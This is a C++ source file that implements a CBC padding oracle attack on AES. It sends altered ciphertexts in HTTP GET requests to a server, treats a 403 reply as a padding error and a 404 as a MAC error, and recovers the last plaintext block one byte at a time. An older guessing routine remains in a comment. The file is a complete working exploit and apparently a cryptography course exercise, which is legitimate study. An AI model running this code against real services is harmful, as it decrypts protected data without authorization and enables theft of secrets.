#include "PaddingOracle.h"
#include "cpprest/http_client.h"
#include "utils.h"
#include "cryptocpp562/aes.h"
#include <iostream>

using namespace web::http;
using namespace web::http::client;

ERROR_TYPE sendHTTPRequest(const std::string& str)
{
    ERROR_TYPE retCode = ERROR_TYPE_SUCCESS;
    http_client client(U(str));
    client.request(methods::GET).then([&](http_response response)
    {
        // Perform actions here to inspect the HTTP response...
        //std::cout << "response: " << response.to_string() << std::endl;
        if (response.status_code() == status_codes::Forbidden)
		retCode = ERROR_TYPE_PADDING;
	else if (response.status_code() == status_codes::NotFound)
		retCode = ERROR_TYPE_MAC;
    }).wait();
    return retCode;
}

namespace
{
/*
	char decodeOneByte(const std::string& response, unsigned char pos, std::string& cipherText)
	{
	    for (unsigned short guess = 0; guess < 256; ++guess)
	    {
		std::string requestStr(cipherText);
		requestStr[requestStr.size() - 1 - CryptoPP::AES::BLOCKSIZE - pos] ^= guess;
		for (unsigned char pad = 0; pad <= pos; ++pad)
		{
			requestStr[requestStr.size() - 1 - CryptoPP::AES::BLOCKSIZE - pad] ^= pos + 1;
		}
		requestStr = convertToHex(requestStr);
		//std::cout << response + requestStr << std::endl;
		if (ERROR_TYPE_PADDING != sendHTTPRequest(response + requestStr))
		{
			cipherText[cipherText.size() - 1 - CryptoPP::AES::BLOCKSIZE - pos] ^= guess;
			return guess;
		}
	    }
	    return 0;
	}
*/
	char decodeOneByte(const std::string& response, unsigned char pos, std::string& cipherText)
	{
	    auto offset = cipherText.size() - 1 - CryptoPP::AES::BLOCKSIZE;
            for (unsigned short guess = 0; guess < 256; ++guess)
	    {
		cipherText[offset - pos] ^= guess;
		//std::cout << response + convertToHex(cipherText) << std::endl;
		if (ERROR_TYPE_PADDING != sendHTTPRequest(response + convertToHex(cipherText)))
			return guess;
		cipherText[offset - pos] ^= guess; // cancel cuurent guess
	    }
	    return 0;
	}
	
	void applyPad(unsigned char pos, std::string& cipherText)
	{
	    auto offset = cipherText.size() - 1 - CryptoPP::AES::BLOCKSIZE;
	    for (unsigned char pad = 0; pad <= pos; ++pad)
	    {
		cipherText[offset - pad] ^= pos + 1;
	    }	    
	}
}

std::string decodeLastBlock(const std::string& response, const std::string& text)
{
    std::string decoded(text);
    std::string result(CryptoPP::AES::BLOCKSIZE, 0);
    for (unsigned char pos = 0; pos < 16; ++pos)
    {
	applyPad(pos, decoded);
	result[CryptoPP::AES::BLOCKSIZE - 1 - pos] = decodeOneByte(response, pos, decoded);
	//std::cout << result[CryptoPP::AES::BLOCKSIZE - 1 - pos] << std::endl;
	applyPad(pos, decoded); // cancel current pad
    }
    return result;
}
